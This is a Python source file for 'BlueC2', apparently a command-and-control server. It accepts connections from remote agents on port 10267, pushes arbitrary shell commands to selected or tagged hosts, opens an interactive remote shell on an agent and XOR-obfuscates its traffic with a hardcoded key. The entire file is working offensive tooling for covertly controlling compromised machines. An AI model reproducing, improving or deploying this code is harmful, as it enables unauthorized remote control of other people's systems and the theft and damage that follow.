#!/usr/bin/python3

import socket,threading,re,logging,platform,os,time
from datetime import datetime
from agent import Agent

IP_REGEX = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'

class BlueServer:

    __slots__ = ["ip","port","targets","connections","running","sock","agent_count","logger","key"]

    def __init__(self,port):
        self.port = port
        self.connections = []
        self.targets = []
        self.ip = None
        self.running = False 
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind(('0.0.0.0',self.port))
        self.sock.listen(10) #sets backlog to 10
        self.sock.settimeout(10.0)
        self.agent_count = 0
        self.key = "chandifortnite"
        self.logger = logging.getLogger(__name__)
        logfilename = None
        if platform.system() == 'Linux':
            logfilename = "/var/log/bluec2.log"
            self.create_logfile(logfilename)
        elif platform.system() == 'Windows':
            logfilename = "C:/Code/BlueC2/bluec2.log" #Fix this later to create a valid path
            self.create_logfile(logfilename)
        else:
            raise ValueError("Unrecognized OS:",platform.system())
        logging.basicConfig(filename=logfilename, encoding='utf-8', level=logging.DEBUG)

    def handle_command(self,userin):
        splits = userin.split(" ") #splits userinput on each space
        if userin.upper() in ["QUIT","EXIT","Q"]:
            validate = input("Confirmation required: are you sure you want to quit? (y/n)\n")
            if validate.upper() in ["YES","Y"]:
                for conn in self.connections: #Kills all connections before terminating program
                    conn.sock.shutdown(socket.SHUT_RDWR)
                    conn.sock.close()
                self.stop()
            else:
                print("Cancelling QUIT command")
        elif userin.upper() == "HELP" or userin == "?":
            self.help()
        elif splits[0].upper() == "SET":
            #Handles setting information
            if splits[1].upper() == "HELP":
                self.help("set")
            elif splits[1].upper() == "TARGETS":
                self.targets = []
                if splits[2].upper() == "TAGGED":
                    tag = splits[3]
                    for conn in self.connections:
                        if tag in conn.tags:
                            self.targets.append(conn)
                else:
                    targets = splits[2].split(",")
                    for target in targets:
                        match = re.match(IP_REGEX,target)
                        if target in self.targets:
                            continue
                        elif match:
                            self.targets.append(self.ip_to_agent(target))
                        elif self.agentnum_to_agent(target) != None:
                            self.targets.append(self.agentnum_to_agent(target))
                        else:
                            print(target + " not a found connection")
            else:
                print("Invalid command, use SET HELP to see valid paramaters for SET")
        elif splits[0].upper() == "CMD":
            cmd = ' '.join(splits[1:])
            cmd = cmd.strip()
            for target in self.targets:
                if target.is_locked():
                    while target.is_locked():
                        time.sleep(1)
                target.lock()
                self.send_cmd(cmd,target)
                target.unlock()
        elif userin.upper() in ["SHOW CONNECTIONS","SHOW CONNS"]:
            for conn in self.connections:
                if conn.sock == None:
                    self.connections.remove(conn)
                    continue
                if conn != self.connections[-1]:
                    print(str(conn),end=",")
                else:
                    print(str(conn))
        elif userin.upper() == "SHOW TARGETS":
            for target in self.targets:
                if target.sock == None:
                    self.targets.remove(target)
                    continue
                if target != self.targets[-1]:
                    print(str(target),end=",")
                else:
                    print(str(target))
        elif splits[0].upper() == "SHOW" and splits[1].upper() == "TAGGED":
            tag = splits[2]
            for conn in self.connections:
                if tag in conn.tags:
                    print(str(conn))
        elif splits[0].upper() == "KILL":
            agents = splits[1].split(",")
            for a in agents:
                agent = self.agentnum_to_agent(a)
                self.disconnect_agent(agent)
        elif splits[0].upper() == "SHELL":
            agent = self.agentnum_to_agent(splits[1])
            if agent != None:
                shell_in = ""
                while shell_in not in ["quit", "exit","logout"]:
                    shell_in = input("$ ")
                    if shell_in in ["quit", "exit","logout"]:
                        break
                    splits = shell_in.split()
                    cmd = shell_in.strip()
                    self.send_cmd(cmd,agent)
            else:
                print("Invalid Agent")
        elif splits[0].upper() + " " + splits[1].upper() == "APPLY TEMPLATE":
            if splits[2].upper() == "IP":
                self.apply_template("ip")
        elif splits[0].upper() + " " + splits[1].upper() == "SHOW TAGS":
            agent = self.agentnum_to_agent(int(splits[2]))
            agent.display_tags()
        elif splits[0].upper() == "TAG":
            agent = self.agentnum_to_agent(int(splits[1]))
            tag = splits[2]
            if tag not in agent.tags:
                agent.tags.append(tag)
        else:
            print("Command does not exist\n")

    def send_cmd(self, cmd, agent):
        cmd = "cmd|" + cmd
        agent.sock.settimeout(10)
        try:
            agent.sock.send(self.encrypt(cmd.encode()))
            result = ""
            try:
                while True:
                    reply = self.decrypt(agent.sock.recv(50000)).decode()
                    if reply == "END":
                        break
                    else:
                        result += reply
            except socket.timeout:
                    print(str(agent) + " timed out")
                    logging.error("Socket timeout:" + str(agent) + ":" + self.get_timestamp())
            print(str(agent) + ":\n" + result)
        except UnicodeDecodeError:
            print(str(agent) + "\nERROR: Unicode Decode Error")
            logging.error("Unicode decode error:" + str(agent) + ":" + self.get_timestamp())
        except ConnectionError:
            print(str(agent) + "\nERROR: Connection Error\n")
            logging.error("Connection error:" + str(agent) + ":" + self.get_timestamp())
            self.disconnect_agent(agent)
        except BrokenPipeError:
            print(str(agent) + "\nERROR: Broken pipe error\n")
            logging.error("Broken pipe error:" + str(agent) + ":" + self.get_timestamp())
        except Exception as e:
            print(str(agent) + "\nERROR: Unknown error\n" + str(e))
            logging.error("Unknown error:" + str(e) + ":" + self.get_timestamp())

    def start(self):
        logging.info("BlueC2 server starting:"+self.get_timestamp())
        self.running = True
        listener = threading.Thread(target=self.accept_connections, daemon=True)
        listener.start()
        heartbeat = threading.Thread(target=self.heartbeat_all_conns,daemon=True)
        heartbeat.start()
        logging.info("Startup process complete:"+self.get_timestamp())
        #Command handler
        while self.running == True:
            userin = input("> ")
            self.handle_command(userin)

    def get_timestamp(self):
        return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
    def stop(self):
        self.running = False
        for conn in self.connections:
            try:
                self.disconnect_agent(conn)
            except:
                continue
        logging.info("BlueC2 Server Shutdown:"+self.get_timestamp())

    def create_logfile(self,logfilename):
        directory = os.path.dirname(logfilename)
        file_name = os.path.basename(logfilename)
        os.makedirs(directory, exist_ok=True)
        f = open(file_name, 'a')
        f.close()

    def help(self,menu="main"):
      if menu == "main":
        #Displays help menu
        print("Commands: ")
        print("HELP\tDisplay this help menu")
        print("QUIT\tExit and shutdown server")
        print("SET <PARAMS>\tSets options for running program. Use SET HELP for more info")
        print("CMD <COMMAND>\tRuns a certain command on all selected targets")
        print("SHOW CONNECTIONS\tShows all connected agents")
        print("SHOW TARGETS\tShows all currently targeted agents")
        print("SHOW TAGS <AGENT #>\tShows all tags applied to specified agent")
        print("SHOW TAGGED <TAG>\tShows all agents with specified tag")
        print("KILL <AGENT #>\tDisconnects specified agent")
        print("SHELL <Agent #>\tSimulates an interactive shell on specified agent")
        print("APPLY TEMPLATE IP\tApplies IP based tags to agents as defined in templates/ip_templates.txt")
        print("TAG <AGENT #> <TAG>\tApply a tag to specified agent")
      elif menu == "set":
        print("Usage: SET <ARG>")
        print("SET HELP\tDisplay this help menu")
        print("SET TARGETS <Comma sepetated list of target ips/agent #s>\tSets the targets to each target specified in a comma seperated list (Note: Overwrites previous targets)")
        print("SET TARGETS TAGGED <TAG>\tSet targets to all agents with specified tag")
      else:
        raise ValueError("Invalid Menu")
        
    def accept_connections(self):
        while self.running == True:
            try:
                sock,ip = self.sock.accept()
                self.agent_count+=1
                newAgent = Agent(self.agent_count,sock,ip)
                logging.info("Accepted connection from "+newAgent.ip[0]+":"+self.get_timestamp())
                local_ip = self.decrypt(newAgent.sock.recv(20)).decode()
                if local_ip not in [""," ","Unsupported OS"]:
                    newAgent.local_ip = local_ip
                self.connections.append(newAgent)
            except socket.timeout:
                continue
            except Exception as e:
                logging.error("Error accepting connection:"+str(e)+":"+self.get_timestamp())

    def ip_to_agent(self,ip):
        for agent in self.connections:
            if agent.ipaddr == ip:
                return agent
        return None #null return if no agents match

    def agentnum_to_agent(self,agentnum):
        for agent in self.connections:
            if int(agent.number) == int(agentnum):
                return agent
        return None #null return if no agents match
    
    def send_heartbeat(self,agent):
        if agent.is_locked():
            return
        if agent.sock == None:
            self.disconnect_agent(agent)
            return
        try:
            reply = ""
            agent.lock()
            agent.sock.send(self.encrypt("heartbeat".encode())) 
            reply = self.decrypt(agent.sock.recv(10)).decode()
            if reply != "ACTIVE":
                logging.warning("Lost connection to " + agent.ip[0]+":"+self.get_timestamp())
                self.connections.remove(agent)
        except socket.timeout:
            agent.no_response_count+=1
        except Exception as e:
            logging.error("Error sending heartbeat:"+str(e)+":"+self.get_timestamp())
            agent.no_response_count+=1
        finally:
            agent.unlock()
            if agent.no_response_count > 3:
                self.disconnect_agent(agent)
                agent.no_response_count = 0
    
    def heartbeat_all_conns(self):
        while self.running == True:
            for conn in self.connections:
                self.send_heartbeat(conn)
                time.sleep(60) #pauses for one minute

    def disconnect_agent(self,agent):
        logging.warning("Lost connection to " + agent.ip[0]+"(timeout):"+self.get_timestamp())
        print("Agent " + str(agent.number) + " timed out, removing from connections")
        self.connections.remove(agent)
        try:
            agent.sock.shutdown(socket.SHUT_RDWR)
            agent.sock.close()
        except:
            pass
        if agent in self.targets:
            self.targets.remove(agent)

                
    def xor(self, data, key):
        return bytes([a ^ b for a, b in zip(data, key)])

    def encrypt(self, data):
        key = self.key * (len(data) // len(self.key)) + self.key[:len(data) % len(self.key)]
        return self.xor(data, key.encode())

    def decrypt(self, data):
        key = self.key * (len(data) // len(self.key)) + self.key[:len(data) % len(self.key)]
        return self.xor(data, key.encode())
    
    def apply_template(self,template_type):
        #apply tags to agents based on if they match the IP address format
        if template_type == "ip":
            with open("./templates/ip_templates.txt") as template:
                for line in template:
                    ip,tags = line.split("=")
                    ip_segments = ip.split(".")
                    fits = True
                    index = 0
                    for conn in self.connections:
                        conn_ip_segments = conn.local_ip.split(".")
                        for segment in ip_segments:
                            if segment in ["*","x"]:
                                index+=1
                                continue
                            else:
                                if segment == conn_ip_segments[index]:
                                    index+=1
                                    continue
                                else:
                                    fits = False
                                    break
                        if fits == True:
                            for tag in tags.split(","):
                                if tag not in conn.tags:
                                    conn.tags.append(tag)
        else:
            print("ERROR: Invalid template type")

def display_banner():
    try:
        with open("./banner.txt") as banner:
            print(''.join([line for line in banner]))
    except:
        print("Starting BlueC2...\n")
    print("\n")

def main():
    try:
        server = BlueServer(10267)
        display_banner()
        server.start()
    except KeyboardInterrupt:
        server.logger.critical("KEYBOARD INTERRUPT:"+server.get_timestamp())
        server.stop()
    except Exception as e:
        server.logger.critical("UNHANDLED EXCEPTION:\t"+ str(e) + "\t" + server.get_timestamp())
        print("Unhandled Exception:",e)
        
if __name__ == "__main__":
    main()